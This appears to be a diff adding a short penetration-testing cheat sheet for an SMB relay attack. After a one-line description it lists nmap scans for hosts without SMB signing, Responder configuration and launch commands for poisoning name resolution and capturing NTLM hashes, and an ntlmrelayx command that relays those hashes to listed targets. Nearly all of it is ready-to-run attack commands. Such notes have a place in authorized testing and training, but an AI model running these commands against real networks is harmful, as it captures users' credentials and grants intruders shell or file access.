@@ -1,0 +1,25 @@
+
+A SMB relay attack is where an attacker captures a users NTLM hash and relays its to another machine on the network. Masquerading as the user and authenticating against SMB to gain shell or file access.
+
+-- Nmap --
+nmap -p 445 --script=smb2-security-mode 10.0.0.25
+nmap -p 445 --script=smb2-security-mode 10.0.0.0/24
+nmap --script=smb2-security-mode.nse -p 445 -Pn --open 10.10.10.0/24
+
+
+-- Responer Config File --
+
+sudo mousepad /etc/responder/Responder.conf
+SMB = Off
+HTTP = Off
+
+
+-- Responder --
+
+sudo responder -I eth0 -rdw -v
+sudo responder -I eth0 -dwP
+
+
+-- ntlmrelayx --
+
+ntlmrelayx.py -tf targets.txt -smb2support
